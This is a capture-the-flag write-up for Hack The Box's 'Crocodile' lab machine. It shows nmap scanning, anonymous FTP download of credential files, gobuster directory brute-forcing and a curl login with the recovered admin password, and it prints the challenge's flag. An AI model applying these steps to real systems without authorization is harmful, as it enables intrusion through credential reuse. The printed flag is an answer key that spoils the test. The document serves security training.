HTB Writeup: Crocodile
Difficulty: Very Easy

OS: Linux

Target IP: 10.129.X.X

# 1. Introduction
Crocodile is a Tier 1 "Starting Point" machine. It demonstrates how credentials found in one service (FTP) can be reused to gain access to a hidden administrative area of a web server.

# 2. Enumeration
Nmap Scan
We begin with a script and version scan to identify open ports.

Bash
nmap -sC -sV -p21,80 10.129.X.X
Results:

Port 21/tcp: FTP (vsftpd 3.0.3) - Anonymous login allowed.

Port 80/tcp: HTTP (Apache httpd 2.4.41).

# 3. Exploitation
Step 1: FTP Data Extraction
Since anonymous login is enabled, we check the FTP server for interesting files.

Bash
ftp 10.129.X.X
# Name: anonymous
# Password: (leave blank)

ftp> dir
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> exit
Credentials Found:
Checking the downloaded files reveals potential login info:

Bash
cat allowed.userlist        # e.g., admin
cat allowed.userlist.passwd # e.g., Supersecretpassword1
Step 2: Web Directory Brute-forcing
The homepage on port 80 is a static site. We use gobuster to find hidden login pages or PHP files.

Bash
gobuster dir --url http://10.129.X.X/ --wordlist /usr/share/wordlists/dirb/common.txt -x php,html
Discovery: Found /login.php.

# 4. Admin Login & Flag Retrieval
Using the credentials found earlier (admin : Supersecretpassword1), we log in to the administrative panel.

Manual Login:
Navigate to http://10.129.X.X/login.php in your browser and enter the credentials.

Command Line (Alternative):

Bash
curl -d "username=admin&password=Supersecretpassword1" http://10.129.X.X/login.php
Success! The flag is displayed at the top of the admin panel dashboard upon successful login.

Flag: c71102778289ea6a7631168f0e4708d7

# 5. Summary & Key Takeaways
Information Leakage: Files left on an anonymous FTP server can provide the "keys to the kingdom" for other services.

Directory Fuzzing: Always look for hidden files (.php, .html, .bak) when a web server appears to be just a simple landing page.

Credential Reuse: Attackers will always try credentials found in one service against all other available login portals.
